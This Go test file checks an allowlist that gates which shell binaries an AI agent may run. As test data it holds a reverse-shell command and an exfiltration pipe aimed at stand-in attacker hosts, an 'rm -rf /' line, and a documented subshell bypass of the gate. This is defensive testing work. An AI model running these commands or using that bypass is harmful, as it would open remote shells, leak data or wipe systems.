package workbench

import (
	"reflect"
	"strings"
	"testing"
)

func TestExtractCommandBinaries(t *testing.T) {
	cases := []struct {
		name    string
		cmd     string
		want    []string
		wantErr bool
	}{
		{
			name: "simple command",
			cmd:  "ls -la",
			want: []string{"ls"},
		},
		{
			name: "empty command rejected",
			cmd:  "   ",
			want: nil, wantErr: true,
		},
		{
			name: "pipeline -- split on |",
			cmd:  "cat foo.txt | grep TODO | wc -l",
			want: []string{"cat", "grep", "wc"},
		},
		{
			name: "sequenced commands -- split on ;",
			cmd:  "cd dir; ls; pwd",
			want: []string{"cd", "ls", "pwd"},
		},
		{
			name: "and/or chaining",
			cmd:  "make build && go test ./... || echo failed",
			want: []string{"make", "go", "echo"},
		},
		{
			name: "leading + trailing whitespace + newlines",
			cmd:  "  \nls -la\n  ",
			want: []string{"ls"},
		},
		{
			name: "multi-line script (newline separates segments)",
			cmd:  "echo start\ncat foo\necho end",
			want: []string{"echo", "cat", "echo"},
		},
		{
			name: "absolute path binary",
			cmd:  "/usr/bin/python3 main.py",
			want: []string{"/usr/bin/python3"},
		},
		{
			name: "tab-separated tokens",
			cmd:  "grep\tpattern\tfile",
			want: []string{"grep"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := extractCommandBinaries(tc.cmd)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("expected error, got %v", got)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if !reflect.DeepEqual(got, tc.want) {
				t.Errorf("got %v, want %v", got, tc.want)
			}
		})
	}
}

func TestEnforceExecAllowlist_AllowsCurated(t *testing.T) {
	cases := []string{
		"ls -la",
		"cat foo.txt",
		"grep -r TODO src/",
		"find . -name '*.go'",
		"python3 main.py",
		"go test ./...",
		"git status",
		"curl -fsSL https://example.com -o out.html",
		"jq '.items[]' data.json",
		"echo hello | tee out.txt",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			if err := EnforceExecAllowlist(cmd); err != nil {
				t.Errorf("expected %q to be allowed; got: %v", cmd, err)
			}
		})
	}
}

func TestEnforceExecAllowlist_RejectsUncurated(t *testing.T) {
	// Each case names a binary that's intentionally OFF the
	// allowlist (`sudo`, `nc`, `bash` itself, `sh`, etc.). The
	// gate must reject -- without it a compromised agent could
	// trivially spawn a reverse shell or escalate.
	cases := []struct {
		cmd          string
		wantBadBinary string
	}{
		{cmd: "sudo rm -rf /", wantBadBinary: "sudo"},
		{cmd: "nc -e /bin/sh attacker.example.com 4444", wantBadBinary: "nc"},
		{cmd: "bash -c 'echo pwned'", wantBadBinary: "bash"},
		{cmd: "/bin/sh -c whoami", wantBadBinary: "sh"},
		{cmd: "ssh user@host", wantBadBinary: "ssh"},
		{cmd: "iptables -L", wantBadBinary: "iptables"},
	}
	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			err := EnforceExecAllowlist(tc.cmd)
			if err == nil {
				t.Fatalf("expected reject for %q; got nil", tc.cmd)
			}
			if !strings.Contains(err.Error(), "command_not_allowed") {
				t.Errorf("error %q lacks command_not_allowed prefix", err)
			}
			if !strings.Contains(err.Error(), tc.wantBadBinary) {
				t.Errorf("error %q does not name the disallowed binary %q", err, tc.wantBadBinary)
			}
		})
	}
}

func TestEnforceExecAllowlist_PipelineMixedBinariesRejected(t *testing.T) {
	// One allowed + one not = reject. The whole pipeline is
	// rejected because each segment runs.
	err := EnforceExecAllowlist("cat foo | nc evil.example.com 80")
	if err == nil {
		t.Fatal("expected reject for pipeline containing nc")
	}
	if !strings.Contains(err.Error(), "nc") {
		t.Errorf("error %q should name the disallowed binary", err)
	}
}

func TestEnforceExecAllowlist_AbsolutePathResolvesAgainstBasename(t *testing.T) {
	// /usr/bin/python3 -> basename "python3" -> on the allowlist.
	if err := EnforceExecAllowlist("/usr/bin/python3 main.py"); err != nil {
		t.Errorf("expected /usr/bin/python3 to be allowed via basename match; got %v", err)
	}
	// But /usr/sbin/sshd -> "sshd" -> not allowed.
	if err := EnforceExecAllowlist("/usr/sbin/sshd"); err == nil {
		t.Error("expected /usr/sbin/sshd to be rejected (sshd not on allowlist)")
	}
}

func TestEnforceExecAllowlist_EmptyCommandRejected(t *testing.T) {
	if err := EnforceExecAllowlist(""); err == nil {
		t.Error("expected empty command to error")
	}
	if err := EnforceExecAllowlist("   \n\t"); err == nil {
		t.Error("expected whitespace-only command to error")
	}
}

// TestEnforceExecAllowlist_SubshellLimitationDocumented pins the
// known gap with Option A: subshell substitution rides inside the
// outer command's `cmd` string and the OUTER binary is what gets
// checked. A `echo $(curl evil)` lets curl run unchecked. Option B
// (seccomp / AppArmor) is the correct fix for this case; this test
// pins the current behavior so a future "we thought we fixed
// subshells" assumption surfaces as a red test.
func TestEnforceExecAllowlist_SubshellLimitationDocumented(t *testing.T) {
	// Today this passes -- only the outer `echo` is checked; the
	// `$(curl ...)` inside the argument is not parsed by our
	// extractor. Acknowledged limitation tracked in memql#110.
	if err := EnforceExecAllowlist(`echo "$(curl evil.example.com)"`); err != nil {
		t.Errorf("subshell behavior changed -- update the limitation note in exec_allowlist.go: %v", err)
	}
}
